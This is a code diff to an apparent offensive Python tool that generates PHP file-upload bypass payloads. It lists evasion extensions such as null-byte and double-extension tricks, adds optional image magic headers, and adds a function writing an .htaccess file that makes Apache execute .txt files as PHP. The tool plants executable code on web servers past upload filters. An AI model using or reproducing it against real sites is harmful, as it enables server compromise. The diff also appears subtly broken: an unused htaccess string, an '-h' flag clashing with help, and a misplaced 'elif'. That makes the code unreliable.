@@ -5,8 +5,8 @@ import platform
 def createFile(name, extension, payload,debug):
     if debug:
         print(f'[+] File created : {name}.{extension}')
-    if "\\" in extension:
-            print(f"[-] You can't use \\ in the extension, create the file manually : {name}.{extension}")
+    elif "\\" in extension:
+        print(f"[-] You can't use \\ in the extension, create the file manually : {name}.{extension}")
     elif "/" in extension:
             print(f"[-] You can't use / in the extension, create the file manually : {name}.{extension}")
     else:
@@ -15,11 +15,24 @@ def createFile(name, extension, payload,debug):
                 f.write(payload)
         else:
             with open(f'Payloads/{name}.{extension}', 'bw') as f:
-                print(payload)
                 f.write(payload)
 
+def createHtaccess(name, htaccess,debug):
+    if debug:
+        print('[+] File created : .htaccess')
 
-def main(name, payload, file, extension, bypass, magic, debug):
+    string = f'<FilesMatch "*{htaccess}">\nSetHandler application/x-httpd-php\nAddHandler php5-script {htaccess}\nAddType application/x-httpd-php {htaccess}\n</FilesMatch>\nphp_flag engine on'
+
+    if platform.system() == 'Windows':
+        with open('Payloads\\.htaccess', 'bw') as f:
+            f.write(b'')
+    else:
+        with open('Payloads/.htaccess', 'bw') as f:
+            f.write(b'<FilesMatch "*">\nSetHandler application/x-httpd-php\nAddHandler php5-script .txt\nAddType application/x-httpd-php .txt\n</FilesMatch>\nphp_flag engine on')
+
+
+
+def main(name, payload, file, extension, bypass, magic, htaccess, debug):
     PHP_extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht', 'phtm', 'phtml', 'pgif', 'shtml', 'htaccess', 'inc', 'phar', 'hphp', 'ctp', 'module']
     PHP_Bypass = ['png.php', 'png.Php5', 'php%20', 'php%0a', 'php%00', 'php%0d%0a','php/','php.\\','png.php','png.pHp5','php%00.png','php\\x00.png','php%0a.png','php%0d%0a.png','phpJunk123png','png.jpg.php', 'php%00.png%00.jpg', 'php.png']
 
@@ -55,7 +68,8 @@ if __name__ == '__main__':
     parser.add_argument('-b', '--bypass', action='store_true', help='Bypass the restriction')
     parser.add_argument('-n', '--name', help='Name of the file', default='payload')
     parser.add_argument('-m', '--magic', help='Magic Header', choices=['png', 'jpg'])
+    parser.add_argument('-h', '--htaccess', help='Creates in addition a .htaccess file')
     args = parser.parse_args()
     print(args)
 
-    main(args.name, args.payload, args.file, args.extension, args.bypass, args.magic, args.debug)
+    main(args.name, args.payload, args.file, args.extension, args.bypass, args.magic, args.htaccess, args.debug)
